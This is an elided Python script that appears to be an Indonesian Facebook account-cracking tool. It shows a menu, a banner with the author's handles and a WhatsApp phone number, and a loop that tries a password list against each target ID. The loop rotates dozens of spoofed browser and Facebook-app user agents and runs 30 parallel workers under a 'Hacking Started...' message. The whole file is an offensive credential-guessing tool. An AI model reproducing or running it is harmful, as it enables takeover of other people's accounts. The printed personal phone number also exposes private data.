...
header_grup = {"user-agent": "Mozilla/5.0 (Windows NT 11.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4868.173 Safari/537.36]"}
...
logo =                                          """   
\x1b[1;92m'  _____ ___  ___ _____  _____   ___   ______
\x1b[1;92m' |_   _||  \/  ||_   _||_   _| / _ \ |___  /
\x1b[1;91m'   | |  | .  . |  | |    | |  / /_\ \   / / 
\x1b[1;97m'   | |  | |\/| |  | |    | |  |  _  |  / /  
\x1b[1;93m'  _| |_ | |  | |  | |   _| |_ | | | |./ /___
\x1b[1;94m'  \___/ \_|  |_/  \_/   \___/ \_| |_/\_____/4.0.4
\x1b[1;92m' -------------------------\x1b[1;92m-----------------------
 AUTHOR  :            BAKTI-XD
 FACEBOOK:            EXT ENS
 GITHUB  :            BAKTI AFISSENA
 WHATDAPP:            0857-6714-4219
 VERSION :            4.0.4
\x1b[1;92m-----------------------\x1b[1;92m------------------------ """                                              
...
def diaz():
    ...
    print(' [E] exit ')
    print('')
    _baktix___ = input(' [✓] Choose option : ')
    if _baktix___ in ('1', '01'):
        __xxx__().diazx(id)
    if _baktix___ in ('2', '02'):
        os.system('python dm.py')
    if _baktix___ in ('E', 'ee'):
        pass
...
class __xxx__:
        ...
        try:
            for pw in __chi__:
                ...
                header = {
                    ...
                    "user-agent":"Mozilla/5.0 (Linux; Android 10; Nokia 7.2) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/87.0.4280.88 Mobile Safari/537.36",
                    ...
                    "user-agent":"Mozilla/5.0 (Linux; Android 3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36",
                    "user-agent":"Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
                    "user-agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109",
                    ...
                    "user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1",         
                     ...
                     "user-agent":"NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
                      "user-agent":"NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)",
                                 ...
                                 "user-agent":"Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36",
                                   ...
                                   "user-agent":"Mozilla/5.0 (Linux; Android 7.0; SM-G930F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
                                  "user-agent":"Mozilla/5.0 (Linux; Android 7.0; MHA-L29 Build/HUAWEIMHA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
                                   "user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/96.0.0.45.70;FBBV/60548545;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/E-Plus;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/0]",
                                  ...
                                  "user-agent":"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
                                    "user-agent":"Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]", 
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            os.system("clear")
            print(logo)
            print("\033[1;36m\r          SEMOGA HASIL NYA IJO {VPN}\033[1;37m")
            print(47*"-")
            ...
            os.system("clear")
            print(logo)
            print("\x1b[1;92m\r          SEMOGA HASIL NYA MANTAP {VPN}\x1b[1;92m")
            print(47*"-")
            print('\x1b[1;92m Total IDs : %s ' % len(self.id))
            print('\x1b[1;92m Hacking Started...')
            print(47*"-")
            with diazhealth(max_workers=30) as healthworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
